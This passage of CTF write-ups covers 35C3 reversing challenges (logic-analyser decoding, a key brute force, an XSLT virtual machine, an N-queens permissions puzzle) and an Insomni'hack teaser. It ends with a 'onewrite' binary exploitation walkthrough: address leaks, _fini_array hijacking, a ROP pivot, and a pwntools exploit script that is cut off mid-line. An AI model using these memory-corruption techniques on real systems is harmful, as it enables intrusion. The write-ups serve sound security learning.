to look for in the data but it is not terribly important to solving the challenge.\n\nUnpacking the `blink.csv.gz` file, we can see that it is a quite large (410 MiB) Comma-Separated Values file, i.e. a text-based table format. In the first 21 lines we see some metadata emitted by the logic analyser, but more importantly, we see the labels for all the 10000000 data entries that follow.\n\n```bash\n$ wc -l blink.csv\n10000021\n$ head -n 22 blink.csv\n#Model,MDO3014\n#Firmware Version,1.26\n#\n#Waveform Type,DIGITAL,,,,,,,,,,,,,\n#Point Format,Y,,,,,,,,,,,,,\n#Horizontal Units,s,,,,,,,,,,,,,\n#Horizontal Scale,0.004,,,,,,,,,,,,,\n#,,,,,,,,,,,,,,\n#Sample Interval,4e-09,,,,,,,,,,,,,\n#Record Length,1e+07,,,,,,,,,,,,,\n#Gating,0.0% to 100.0%,,,,,,,,,,,,,\n#,,,,,,,,,,,,,,\n#Vertical Units,V,V,V,V,V,V,V,V,V,V,V,V,V,V\n#Threshold Used,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65,1.65\n#,,,,,,,,,,,,,,\n#,,,,,,,,,,,,,,\n#,,,,,,,,,,,,,,\n#,,,,,,,,,,,,,,\n#,,,,,,,,,,,,,,\n#Label,OE,LAT,CLK,E,D,C,B,A,B2,B1,G2,G1,R2,R1\n#TIME,D13,D12,D11,D10,D9,D8,D7,D6,D5,D4,D3,D2,D1,D0\n-1.0000000e-03,0,0,0,0,1,0,0,0,0,0,0,1,0,1\n```\n\n`TIME` is the only column with decimal data, but it is irrelevant to us (it is enough to know that successive lines represent samples taken at successive times), so we will ignore it. The remaining columns are all digital, only taking values `0` or `1`. Some of their labels are clear enough, some not so much:\n\n - `OE` - ?\n - `LAT` - latch?\n - `CLK` - clock\n - `E` ... `A` - ? 5 bits = 64 possible values\n - `{R,G,B}{1,2}` - 2 bits for each colour channel - Red, Green, Blue\n\n`CLK` is a very important signal to see in captures like this. It is not trivial to perfectly synchronise two devices, so it is common to use a dedicated clock signal emitted by one device (master) that tells the other (slave) when to read data from the remaining signals. In our case we only need to read data entries when the clock \"goes high\", i.e. its value is `0` on the previous sample and `1` on the current sample.\n\nAt this point we can try to test various theories about how the data is actually transmitted using the remaining signals (`LAT`, `E` ... `A`, and `{R,G,B}{1,2}`). However, for a speedy flag it was worth trying the simplest possible method – what if the Pi transmits displays the flag right away, i.e. there is no metadata exchanged, just pixels?\n\nIt would be useful to know what shape the data would be in. The photo is in good enough resolution (and was actually much higher res during the CTF) for us to be able to count the individual LEDs on the LED board. It consists of two 64x64 squares, 128x64 pixel resolution in total.\n\nThen we can assume that `R1` is the most significant bit of the red channel, `R2` is the LSB (not that it really matters), and print out pixels!\n\n[Full pixel reader script](scripts/Blink.hx)\n\n![](screens/blink.png)\n\nThe output is by no means perfect, but it got us the flag with minimal effort!\n\n`35C3_D4s_blInk3nL1cht3n_1st_so_wund3rb4r`\n\n## 65 rev / corebot ##\n\n**Description**\n\n> https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6\n> \n> Difficulty estimate: easy\n> \n> Guest challenge by Jesko / rattle.\n> \n> **UPDATE**: Challenge binary replaced. Apologies for the inconvenience.\n\n**Files provided**\n\n - [corebot](https://35c3ctf.ccc.ac/uploads/corebot-640d3c582340e647d72e1dd9418a3fd6)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe core function is easy, decrypt specific data using the key generated from `VolumeSerialNumber`, and compare the first 4 bytes of decryption result with `35C3`. In other word, we need to find the correct serial number that can decrypt the data to the flag.\n\nThe best way is to use the brute force crack.\n\n```c\n#include <windows.h>\n#include <stdio.h>\nstruct key\n{\n\tDWORD head[3];\n\tWORD serials[0x10];\n}data;\n\nDWORD cmode = CRYPT_MODE_ECB;\nbool crack(DWORD serialNumber)\n{\n\tDWORD len = 0x20;\n\tBYTE res[] = \"\\x10\\x29\\xB8\\x45\\x9D\\x2A\\xAB\\x93\\xFE\\x89\\xFB\\x82\\x93\\x42\\xA1\\x8C\\x2E\\x90\\x63\\x00\\x06\\x11\\x80\\x64\\xB8\\x21\\xC2\\x9F\\x35\\xE7\\x7E\\xF2\";\n\tHCRYPTPROV cryptContext;\n\tHCRYPTKEY key;\n\tCryptAcquireContextA(&cryptContext, 0, 0, 0x18u, 0);\n    //initialization that gets the context\n\tint i = 16;\n\tdo\n\t{\n\t\t--i;\n\t\tdata.serials[i] = (WORD)serialNumber;\n\t\tserialNumber ^= ((DWORD)(WORD)serialNumber >> 4) ^ \n\t\t\t((WORD)serialNumber << 11) ^ ((WORD)serialNumber << 7);\n        //actually only low 16 bits of serial are used here, so we only need to crack 0x10000 times\n\t}// do some transformation\n\twhile (i);\n\tCryptImportKey(cryptContext, (const BYTE *)&data, 0x2Cu, 0, 0, (HCRYPTKEY *)&key);\n    //import the key from raw bytes to some struct\n\tCryptSetKeyParam(key, KP_MODE, (const BYTE *)&cmode, 0);\n    //set mode to ECB\n\tCryptDecrypt(key, 0, 1, 0, (BYTE *)&res, (DWORD *)&len);\n    //decrypt\n\treturn (memcmp(res, \"35C3\", 4) == 0);\n}\n\nvoid init()\n{\n\tdata.head[0] = 0x208;\n\tdata.head[1] = 0x6610;\n\tdata.head[2] = 0x20;\n}\n\nint main()\n{\n\tinit();\n\tfor (size_t i = 0; i < 0xffffffff; i++)\n\t{\n\t\tif (i % 0x1000 == 0)\n\t\t\tprintf(\"%x\\n\", i);\n\t\tif (crack(i))\n\t\t\tprintf(\"%x\\n\", i);\n\t}\n\treturn 0;\n}\n```\n\nA tricky point is that this program is written by assembly directly, because almost no compiler will generate assembly code like this. Especially, when doing the transformation, the hex-ray will give the wrong pseudo code.\n\nFor example,\n\n```c\n//in the loop\nHIWORD(v18) = serialNumber;                 // wrong!\n```\n\nThis is actually many continuous `push` that create an array finally, instead of assigning to the same variable for 16 times\n\n```assembly\npush    ax              ; push 16 * 2 = 0x20 bytes\n```\n\nalong with the extra 0xC bytes being pushed after the loop, we have 0x2C bytes, which matches the `dwDataLen` argument of `CryptImportKey` exactly.\n\n```assembly\npush    20h\npush    6610h\npush    small 0\npush    small 208h      ; 0xc bytes\n```\n\n## 97 rev / juggle ##\n\n**Description**\n\n> Can you help this restaurant Stack the right amount of Eggs in their ML algorithms?\n> \n> Guest challenge by Tethys.\n> \n> Note that you need to send a shutdown(2) after you sent your solution. The nmap netcat will do so for you, e.g.: `ncat 35.246.237.11 1 < solution.xml`\n> \n> > `/usr/bin/ncat --help | grep -n 1 Ncat 7.60 ( https://nmap.org/ncat )`\n> \n> Files here: https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar\n\n**Files provided**\n\n - [juggle.tar](https://35c3ctf.ccc.ac/uploads/juggle-f6b6fa299ba94bbbbce2058a5ca698db.tar)\n\n**Solution**\n\nAt first I wanted to completely skip this challenge because I thought \"ML\" in the description referred to Machine Learning, not an uncommon theme in difficult CTF challenges. But I'm really glad I got back to it eventually!\n\nIn the archive we are given two files:\n\n - `Dockerfile` - contains the script for deploying a Docker container for this challenge, and its run command, which invokes [Xalan](https://xalan.apache.org/)\n - `challenge.min.xslt` - an [XSLT (Extensible Stylesheet Language Transformations)](https://en.wikipedia.org/wiki/XSLT) file, minified\n\nThe first step is to tidy up the `challenge` file with some auto format.\n\n[Auto-formatted `challenge.xslt`](files/challenge.xslt)\n\nAt this point we can start dissecting the file more comfortably, one bit at a time. The root element, `<xsl:stylesheet>` specifies some XLST \"libraries\", [`math`](http://exslt.org/math/) and [`common`](http://exslt.org/exsl/index.html). It has two child nodes. The first is a template that matches on `/meal` elements. Based on the description we will have to send the challenge server an XML file, so it seems the root element of our file will be `<meal>`. The other is a template with a name, but no element match, so it will be invoked indirectly by the XSLT itself.\n\nLet us have a closer look at the first template, matching on `/meal`. First, there is an assertion:\n\n```xml\n<xsl:if test=\"count(//plate) &gt; 300\">\n  <xsl:message terminate=\"yes\">You do not have enough money to buy that much food</xsl:message>\n</xsl:if>\n```\n\nIf we have more than 300 `<plate>` elements in our submission, the above message is printed and the process is stopped (`terminate=\"yes\"`). Note also the fact that plates are counted with `//plate`, i.e. nested two levels deep (including `<meal>`).\n\nNext, a variable called `chef-drinks` is defined:\n\n```xml\n<xsl:variable name=\"chef-drinks\">\n  <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>\n  <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>\n  <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>\n  <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>\n  <value><xsl:value-of select=\"round(math:random() * 4294967296)\"/></value>\n</xsl:variable>\n```\n\nIt seems to be an array of five randomly generated 32-bit unsigned integers (`4294967296 = 0x100000000 = 2^32`).\n\nFinally, the other template is \"called\", like a function:\n\n```xml\n<xsl:call-template name=\"consume-meal\">\n  <xsl:with-param name=\"chef-drinks\" select=\"exsl:node-set($chef-drinks)//value\"/>\n  <xsl:with-param name=\"food-eaten\" select=\"1\"/>\n  <xsl:with-param name=\"course\" select=\"course[position() = 1]/plate\"/>\n  <xsl:with-param name=\"drinks\" select=\"state/drinks\"/>\n</xsl:call-template>\n```\n\nThe `chef-drinks` variables is given as-is. `food-eaten` is initialised at `1`. `course` is set to all `<plate>` elements in the first `<course>` element of our `<meal>` submission. And finally, `drinks` is initialised to the `<drinks>` element in `<state>`.\n\nBefore looking into what `consume-meal` does, we already know / can guess our submission will have this shape:\n\n```xml\n<meal>\n  <course>\n    <plate>?</plate>\n    <plate>?</plate>\n    ...\n  </course>\n  <course>...</course>\n  ...\n  <state>\n    <drinks>\n      ?\n    </drinks>\n  </state>\n</meal>\n```\n\nNow we can move onto `consume-meal`. Its first lines declare the parameters we already know about – `chef-drinks`, `food-eaten`, `course`, and `drinks`. Then there are two assertions:\n\n```xml\n<xsl:if test=\"$food-eaten &gt; 30000\">\n  <xsl:message terminate=\"yes\">You ate too much and died</xsl:message>\n</xsl:if>\n<xsl:if test=\"count($drinks) &gt; 200\">\n  <xsl:message terminate=\"yes\">You cannot drink that much</xsl:message>\n</xsl:if>\n```\n\nBoth of these seem to be fatal errors. Since `food-eaten` was initialised at `1`, the first assertion would only make sense if `consume-meal` was called multiple times. And indeed, if we scroll a bit further, we will find that `consume-meal` is called again from within itself, i.e. it is recursive. At each step, it increases `food-eaten` by one. In other words, `food-eaten` is a step counter that cannot go above 30000.\n\nBy similar logic, `drinks` must be modified within `consume-meal`, otherwise this assertion could have been made before the initial call. Whatever `drinks` are, we cannot have more than 200 of them.\n\nFinally, we move on to the core of the XSLT. If we have any elements in `$course`, we initialise a couple of variables:\n\n```xml\n<xsl:if test=\"count($course) &gt; 0\">\n  <xsl:variable name=\"c\" select=\"$course[1]\"/>\n  <xsl:variable name=\"r\" select=\"$course[position()&gt;1]\"/>\n  <xsl:choose>\n    ...\n  </xsl:choose>\n</xsl:if>\n```\n\n`c` will refer to the first element of `$course` (since in XML land lists are 1-indexed), and `r` will refer to the remaining elements. Note at this point that `$course` does NOT refer to our `<course>` elements. Recall that `consume-meal` was invoked with `<xsl:with-param name=\"course\" select=\"course[position() = 1]/plate\"/>`, so `$course` will contain the `<plate>` elements of our first `<course>` (on the first iteration).\n\nSo with an input like:\n\n```xml\n<meal>\n  <course>\n    <plate><foo/></plate>\n    <plate><bar/></plate>\n    <plate><baz/></plate>\n  </course>\n  ...\n</meal>\n```\n\nDuring the first call to `consume-meal`, `$c` will be `<plate><foo/></plate>`, and `$r` will be the list of `<plate><bar/></plate>` and `<plate><baz/></plate>`.\n\nAfter `$c` and `$r` are initialised, there is a large `<xsl:choose>` block, equivalent to a `switch` statement in conventional programming languages. The `<xsl:choose>` element checks to see what is \"in\" our plates, i.e. what elements are contained in our `<plate>` element. Let us have a look at one of these choices:\n\n```xml\n<xsl:when test=\"count($c/paella) = 1\">\n  <xsl:variable name=\"newdrinks\">\n    <value>\n      <xsl:value-of select=\"$c/paella + 0\"/>\n    </value>\n    <xsl:copy-of select=\"$drinks\"/>\n  </xsl:variable>\n  <xsl:call-template name=\"consume-meal\">\n    <xsl:with-param name=\"chef-drinks\" select=\"$chef-drinks\"/>\n    <xsl:with-param name=\"food-eaten\" select=\"$food-eaten + 1\"/>\n    <xsl:with-param name=\"course\" select=\"$r\"/>\n    <xsl:with-param name=\"drinks\" select=\"exsl:node-set($newdrinks)//value\"/>\n  </xsl:call-template>\n</xsl:when>\n```\n\nIn other words, if our `<plate>` contained a `<paella>` element, we will invoke `consume-meal` again with slightly modified parameters:\n\n - `chef-drinks` - `chef-drinks` (the 5 random numbers) remain the same\n - `food-eaten` - increased by one\n - `course` - `$r`, i.e. the remaining plates of this `<course>`\n - `drinks` - `$newdrinks`, created just above, consisting of some value (contained within our `<paella>` element) prepended to the original `$drinks`\n\nBy this point it should be pretty clear that this XSLT is in fact a virtual machine! Each `<plate>` will contain an instruction which will modify the state and pass that state onto the next invocation of `consume-meal`. The `<course>` elements are blocks of instructions, in essence behaving like labels. `drinks` are in fact our stack. With a `<paella>` instruction we can push an immediate value to our stack. We can analyse all the instructions one by one:\n\n - `宫保鸡丁` - debug command, prints `chef-drinks` as well as `drinks`\n - `paella` - push immediate value to stack\n - `불고기` - duplicate a given element of the stack and push it\n - `Борщ` - pop top element of `chef-drinks` if it matches top of `drinks`\n - `दाल` - print the flag if no `chef-drinks` remain\n - `ラーメン` - push 1 if top of `drinks` is greater than top of `chef-drinks`, 0 otherwise\n - `stroopwafels` - push 1 if 2nd value in `drinks` is greater than top value in `drinks`\n - `köttbullar` - move a given element from `drinks` to the top\n - `γύρος` - remove a given element from `drinks`\n - `rösti` - add top elements of `drinks`\n - `לאַטקעס` - subtract top elements of `drinks`\n - `poutine` - multiply top elements of `drinks`\n - `حُمُّص` - integer divide top elements of `drinks`\n - `æblegrød` - jump to a given `<course>` if top of `drinks` is not 0\n\nA limited instruction set, but Turing-complete nonetheless. Of particular note is `दाल` - prints the flag if (and only if) there are no more `chef-drinks`. In fact the 5 random numbers generated at the beginning form an additional stack, one that we cannot directly manipulate. The debug command `宫保鸡丁` prints out the values of `chef-drinks` (as well as our `drinks`), but this is indeed only useful for debugging – each time we run our XML on the server, the numbers are different, and we have no way to send what we saw from the debug command back to the XML file we submitted.\n\nSo our XML needs to run instructions that will guess the `chef-drinks` (using `Борщ`) one by one, without seeing their values. The only other instruction dealing with `chef-drinks` is `ラーメン`, which compares the top of our stack `drinks` with the top of the challenge stack `chef-drinks`.\n\nIn other words, we need to implement a binary search. We can adapt the pseudo-code for [binary search from Rosetta code](http://rosettacode.org/wiki/Binary_search):\n\n    BinarySearch(A[0..N-1], value) {\n        low = 0\n        high = N - 1\n        while (low <= high) {\n            // invariants: value > A[i] for all i < low\n                           value < A[i] for all i > high\n            mid = (low + high) / 2\n            if (A[mid] > value)\n                high = mid - 1\n            else if (A[mid] < value)\n                low = mid + 1\n            else\n                return mid\n        }\n        return not_found // value would be inserted at index \"low\"\n    }\n\nSince we only have `>`, the code we will implement is:\n\n    high = 0x100000000;\n    low = 0;\n    while (high > low) {\n      var mid = (low + high) >> 1; // integer divide by two\n      if (mid + 1 > number) {\n        high = mid;\n      } else {\n        low = mid + 1;\n      }\n    }\n\nDuring the CTF, I chose to implement a simple assembler. I was particularly worried about Unicode messing up my instructions (RTL marks, non-canonical ordering, bad copypaste), but of course labels and a minimum of type safety was a plus. Debugging wasn't particularly easy with the remote server, so at some point I also implemented an emulator to test my code.\n\n[Full assembler/emulator script here](scripts/Juggle.hx)\n\n```bash\n$ haxe -D EMULATE --run Juggle\nins(0): PUSHI(0); stack: 0\nins(1): PUSHI(8388608); stack: 8388608,0\nins(2): PUSHI(1); stack: 1,8388608,0\nins(3): PUSHI(1); stack: 1,1,8388608,0\nins(4): JMP; stack: 8388608,0\nins(0): PUSHI(2); stack: 2,8388608,0\nins(1): PUSHI(1); stack: 1,2,8388608,0\nins(2): DUPN; stack: 8388608,2,8388608,0\nins(3): PUSHI(3); stack: 3,8388608,2,8388608,0\nins(4): DUPN; stack: 0,8388608,2,8388608,0\n...\n... etc etc\n...\nins(0): PUSHI(0); stack: 0,6830991,6830991\nins(1): DROP; stack: 6830991\nins(2): CHECK; checking 6830991 against 6830991 ... OK!\nstack: \nins(3): END; flag!\n```\n\nThe submission generated is available [here](scripts/sol.xml). After running it on the server, we get the flag:\n\n`35C3_The_chef_gives_you_his_compliments`\n\n## 215 rev / notifico ##\n\n**Description**\n\n> veni, vidi, notifici\n> \n> Notes: - only chmod, no touch - no root user, please - tar --no-same-owner -xhzf chall.tar.gz\n> \n> [Challenge files](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/notifico-b568d7b9b60a42e7e06471e2f9cb0883.tar.gz)\n> \n> **HINT**: The graph is a move graph for a certain type of chess piece.\n\n**Files provided**\n\n - [notifico.tar.gz](https://archive.aachen.ccc.de/35c3ctf.ccc.ac/uploads/notifico-b568d7b9b60a42e7e06471e2f9cb0883.tar.gz)\n\n**Solution**\n\nIn the `tar` archive, we see three files:\n\n - `chall.tar` - another archive containing 225 directories with some 40-50 files each, although all but one in each directory are symlinks\n - `check.py` - flag decryption script invoking `check` in the process\n - `check` - ELF executable to verify a given directory\n\nThe first step was to look into `check.py`. The important bit was:\n\n```python\nVAL = 15\n\n# ...\n\nres = subprocess.call([\"./check\", basedir])\n\nif res == 255 or res != VAL:\n    print(\"This looks no good...\")\n    exit(-1)\nelse:\n    print(\"A worthy try, let's see if it yields something readable...\")\n```\n\nSo whatever directory we give it as our \"solution\", it will invoke the `check` executable on it. `check` in turn must return `VAL`, i.e. `15` for the solution to be considered valid. The SHA-256 hash of the UNIX permissions of the files in our solution directory is then used to decrypt a flag encrypted using AES. Given that there are `225` \"regular\" files and hundreds of symlinks in the `chall.tar` archive which forms the template for our solution, brute-force is infeasible.\n\nThe hint given in the challenge description spoils what `chall.tar` is completely, so much so that I am surprised this challenge didn't have many more solutions after the hint was released. We can gain a similar understanding of `chall.tar` from how the `check` executable works and the general structure of the archive.\n\nUsing IDA Pro we can find that `check` does roughly the following:\n\n - sets up `inotify` watchers on all regular (non-symlink) files in each of the `225` directories\n - try to `fopen` each of the `225` regular files in read/write mode, then `fclose`\n - set `result` to `0`\n - handle all triggered `inotify` events:\n   - increment `result` by `1`\n   - for each `IN_CLOSE_WRITE` event (i.e. file closed after write access), try to `execve` all the symlinks in the just-closed file's directory\n - exit with exit code `result`\n\nNote that `execve` will only succeed when the file referenced by the symlink can be executed; if `execve` succeeds, the program will crash, because there are no valid executables in the `chall.tar` directory (each regular file is only 1 byte long).\n\nIn other words, `check` counts the regular files it can open whose \"neighbours\" (i.e. files referenced by the symlink it that file's directory) are not executable.\n\nOne more extremely important hint: the number of directories in `chall.tar` is `225`, which is `15 * 15`, a perfect square. `VAL` is also `15`.\n\nWe can also count how many files there are in each of the `225` directories. If we simply extract the archive and go through the directories in alphabetical order, the result is rather chaotic. However, the directories are contained in `chall.tar` in a particular order. We can see this with:\n\n```bash\n$ tar -tvf chall.tar\ndrwxr-xr-x  0 notifico notifico    0 Dec 22 14:06 chall/\ndrwxr-xr-x  0 notifico notifico    0 Dec 22 14:06 chall/NrTOYjZgBjJHfNLu/\nlrwxrwxrwx  0 notifico notifico    0 Dec 22 14:06 chall/NrTOYjZgBjJHfNLu/clxAKWStzqRKyxql -> ../eAvSLhONEWpXqnwu/JHFulfjgaQGnmOPx\nlrwxrwxrwx  0 notifico notifico    0 Dec 22 14:06 chall/NrTOYjZgBjJHfNLu/OfTFUEFIyGMZMoan -> ../HdWkyeWugdUHdzuU/rUXgDUpTytwSoWon\nlrwxrwxrwx  0 notifico notifico    0 Dec 22 14:06 chall/NrTOYjZgBjJHfNLu/drwKLoWvVcjNdMiX -> ../zoPhogrElBntiQUN/ThQhbYJgbiSZbykb\nlrwxrwxrwx  0 notifico notifico    0 Dec 22 14:06 chall/NrTOYjZgBjJHfNLu/zvXOjUgOepbQeCoe -> ../ISOYfrwvVOMZveHE/jroOyZVjiUCJCHgf\n...\n...\n...\nlrwxrwxrwx  0 notifico notifico    0 Dec 22 14:06 chall/fXWIMMRZvMSweIId/GIlMJUgUbXbYmdSE -> ../pNuhEkCjuZfTZWvi/JFhCuAbdlsMRpcNo\nlrwxrwxrwx  0 notifico notifico    0 Dec 22 14:06 chall/fXWIMMRZvMSweIId/KdDQXPXYBqQARKQc -> ../QdyTwLeNTUDvXTFI/DJLuDDWviVrYegVM\nlrwxrwxrwx  0 notifico notifico    0 Dec 22 14:06 chall/fXWIMMRZvMSweIId/MCOiuhLUCuCoPZvn -> ../vruPGIPvYbkWqNzX/MHinNnRcKtLLeEXV\nlrwxrwxrwx  0 notifico notifico    0 Dec 22 14:06 chall/fXWIMMRZvMSweIId/ufIYqBqbfCgGIspR -> ../vqPxvKvBQGHntyiv/aYPWRwJUyOyHRILd\n-r--------  0 notifico notifico    1 Dec 22 14:06 chall/fXWIMMRZvMSweIId/KYtdUumqvnfClEMF\n```\n\nIf we count the symlinks in the directories in this order and arrange them in a `15 * 15` square, we get a very neat result:\n\n    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42\n    42,  44,  44,  44,  44,  44,  44,  44,  44,  44,  44,  44,  44,  44,  42\n    42,  44,  46,  46,  46,  46,  46,  46,  46,  46,  46,  46,  46,  44,  42\n    42,  44,  46,  48,  48,  48,  48,  48,  48,  48,  48,  48,  46,  44,  42\n    42,  44,  46,  48,  50,  50,  50,  50,  50,  50,  50,  48,  46,  44,  42\n    42,  44,  46,  48,  50,  52,  52,  52,  52,  52,  50,  48,  46,  44,  42\n    42,  44,  46,  48,  50,  52,  54,  54,  54,  52,  50,  48,  46,  44,  42\n    42,  44,  46,  48,  50,  52,  54,  56,  54,  52,  50,  48,  46,  44,  42\n    42,  44,  46,  48,  50,  52,  54,  54,  54,  52,  50,  48,  46,  44,  42\n    42,  44,  46,  48,  50,  52,  52,  52,  52,  52,  50,  48,  46,  44,  42\n    42,  44,  46,  48,  50,  50,  50,  50,  50,  50,  50,  48,  46,  44,  42\n    42,  44,  46,  48,  48,  48,  48,  48,  48,  48,  48,  48,  46,  44,  42\n    42,  44,  46,  46,  46,  46,  46,  46,  46,  46,  46,  46,  46,  44,  42\n    42,  44,  44,  44,  44,  44,  44,  44,  44,  44,  44,  44,  44,  44,  42\n    42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42,  42\n\nIt is symmetric and there are more symlinks in the \"central\" directories.\n\nMaybe you can see where all of this (+ the explicit hint) is leading to. Chess! More specifically, a chess puzzle, the [N queens problem](https://en.wikipedia.org/wiki/Eight_queens_puzzle). The famous eight queens puzzle is a chess puzzle where the goal is to arrange `8` queens on a regular (`8 * 8`) chessboard without any of them being able to see one another (queens can move and see horizontally, vertically, and diagonally). In this case we have a `15` queens puzzle.\n\nConsider for example the top-left directory in the table above. It has `42` symlinks:\n\n    Q,   X,   X,   X,   X,   X,   X,   X,   X,   X,   X,   X,   X,   X,   X\n    X,   X,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .\n    X,   .,   X,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .\n    X,   .,   .,   X,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .\n    X,   .,   .,   .,   X,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .\n    X,   .,   .,   .,   .,   X,   .,   .,   .,   .,   .,   .,   .,   .,   .\n    X,   .,   .,   .,   .,   .,   X,   .,   .,   .,   .,   .,   .,   .,   .\n    X,   .,   .,   .,   .,   .,   .,   X,   .,   .,   .,   .,   .,   .,   .\n    X,   .,   .,   .,   .,   .,   .,   .,   X,   .,   .,   .,   .,   .,   .\n    X,   .,   .,   .,   .,   .,   .,   .,   .,   X,   .,   .,   .,   .,   .\n    X,   .,   .,   .,   .,   .,   .,   .,   .,   .,   X,   .,   .,   .,   .\n    X,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   X,   .,   .,   .\n    X,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   X,   .,   .\n    X,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   X,   .\n    X,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   .,   X\n\nCount the squares that the queen (`Q`) can see (`X`) and there are 42 of them. In fact, each of those `X`'s in the actual `chall.tar` is a symlink to that particular directory.\n\nUnfortunately, there are thousands of solutions to the 15 queens problem. Fortunately, we can generate them systematically with a script and hence decrypt the flag. Once again, we can adapt a program from [Rosetta Code](http://rosettacode.org/wiki/N-queens_problem).\n\n[Adapted C program here](scripts/queens.c)\n\nWe let this C program generate all the solutions to the problem and have a Python script change each solution to a list of UNIX permissions in the order the original `check.py` script used (it sorted the directories alphabetically), SHA-256 hash it, and try to decrypt the flag.\n\n[Python decoder here](scripts/queens.py)\n\n(As per the challenge description, each \"queen\" would be marked by a regular file with `700` permissions, each non-queen would remain at `400` permissions, as provided in the `chall.tar` template.)\n\n`35C3_congr4ts_th0se_were_s0m3_truly_w3ll_pl4c3d_perm1ssions_Sir_`\n", "timestamp": "2025-10-24T11:39:14.464458"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-01-19-Insomni-Hack-Teaser/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-01-19-Insomni-Hack-Teaser/README.md", "content": "## beginner reverse\n\nIt is a binary written in Rust. Initially I got stuck into the Rust stuff, which wasted me much time. The main function at `0x66A0` is long, but many of them are junk codes that do not help to solve the challenge. In fact, the core logic is this loop\n\n```c\ndo\n{\n  if ( v15 == v22 )\n    break;\n  v25 = ((*((_DWORD *)v30 + v23) >> 2) ^ 0xA) == *(_DWORD *)&v15[4 * v23];\n  // if we set a breakpoint here, v15 is the input but is unsigned extended to DWORD array\n  ++v23;\n  v24 += v25;\n  v22 -= 4;\n}\n```\n\nHere it compares the input with something, which is initialized here\n\n```c\n*v0 = xmmword_51000;\nv0[1] = xmmword_51010;\nv0[2] = xmmword_51020;\nv0[3] = xmmword_51030;\nv0[4] = xmmword_51040;\nv0[5] = xmmword_51050;\nv0[6] = xmmword_51060;\nv0[7] = xmmword_51070;\n*((_QWORD *)v0 + 16) = 0x1DE000001E2LL;\n```\n\nAnd it is obvious that the transformation is `(data[i] >> 2) ^ 0xA`, where `data` is an `uint32_t` array.\n\nThus, we can decrypt the flag using IDA Python\n\n```python\nPython>flag = \"\"\nPython>for p in range(0x51000, 0x51080, 4) + range(0x6722, 0x672a, 4):\nPython>  flag += chr((Dword(p) >> 2) ^0xA)\nPython>\nPython>flag\nINS{y0ur_a_r3a1_h4rdc0r3_r3v3rs3r}\n```\n\n## onewrite\n\nThe binary can leak the stack address or PIE address of the program, then an arbitrary 8-byte write is performed, then the program exits. The program was statically linked, so there is no `libc`. Also since the program has not used `execve`, so this function is not provided. Our only way is to use `ret2syscall` by ROP. So we need to leak the 2 addresses without quiting first. The way to not quit after leaking is to rewrite return address in stack. For example, in function `main`,\n\n`do_leak` is called.\n\n```c\n.text:00007FFFF7D52B04                 call    do_leak\n.text:00007FFFF7D52B09                 nop\n```\n\nAnd the value `0x00007FFFF7D52B09` is stored as the return address. (value might change if ASLR is enabled)\n\nIf we rewrite the least significant byte `0x09` to `0x04`, we can execute `do_leak` again after `retn`. In this way we can leak both `stack` and `pie`, and still return to the function `do_leak`.\n\nThen here is the difficult part. Since we can only control `0xf` bytes in stack using `read` in `read_int_3`, we cannot easily construct a ROP chain that allows `ret2syscall`. Initially I decided to rewrite the return address to the start of `do_leak` instead of `call stack` in `main` function, in this way we can \"shift\" the stack down by 8 bytes each time. In the meanwhile, we can gradually construct a ROP chain using `read` in `read_int_3`, with 8 bytes each time.  But this failed to work because `puts` function will overwrite the data that I have putted using `read_int_3` in the last `do_write`.\n\nThen, I found a permanent way to always restart the program: hook the `_fini_array` function table, the functions inside which will be called when `exit` function is called, and the `exit` function will be called after `main` function returns. Thus, If we can change the one of the functions into `_start`, can we alway restart the program after it exits? Unfortunately no. It seems that when the `__libc_start_main` is called second time, a segmentation fault will be created in subroutine `dl_relocate_static_pie`.\n\nWell, if we cannot return to `_start` to restart everything, why not hook `_fini_array` into function like `do_overwrite`? Actually this turns out to be the correct(but not necessarily intended?) method. However, the `exit` function will not be called after the subroutine function returns, so we cannot restart again directly. Luckily, there are 2 entries in `_fini_array`, which will be called in the reverse order. If we can change both of the 2 entries to `do_overwrite`, we can use the first one to rewrite return address to `__libc_csu_fini`(The function that calls the functions in the `_fini_array`) and use the second one to construct ROP, so after then we can return to `__libc_csu_fini` again and do the same thing next time.\n\nI chose to construct ROP below the current `rsp` because there are many gadgets like `add rsp,xxx; ret`. Finally, I used an `add rsp, 0xd0; pop xxx; ret` to pivot the `rsp` onto ROP.\n\nexploit\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext.log_level='debug'\np = ELF(\"./onewrite\")\nif g_local:\n\tsh = process('./onewrite')#env={'LD_PRELOAD':'./libc.so.6'}\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"onewrite.teaser.insomnihack.ch\", 1337)\n\ndef leak(cmd):\n\tsh.recvuntil(\" > \")\n\tsh.send(cmd)\n\tsh.recvuntil(\"0x\")\n\tret = int(sh.recvuntil(\"\\n\"), 16)\n\treturn ret\n\ndef fill_stack(cmd):\n\tsh.recvuntil(\" > \")\n\tsh.send(cmd)\n\tsh.recvuntil(\"Nope\\n\")\n\ndef write(addr, data):\n\tsh.recvuntil(\"address : \")\n\tsh.send(str(addr))\n\tsh.recvuntil(\"data : \")\n\tsh.send(data)\n\nstack_addr = leak(\"1\\x00\")\nwrite(stack_addr + 0x18, p8(0x04)) # 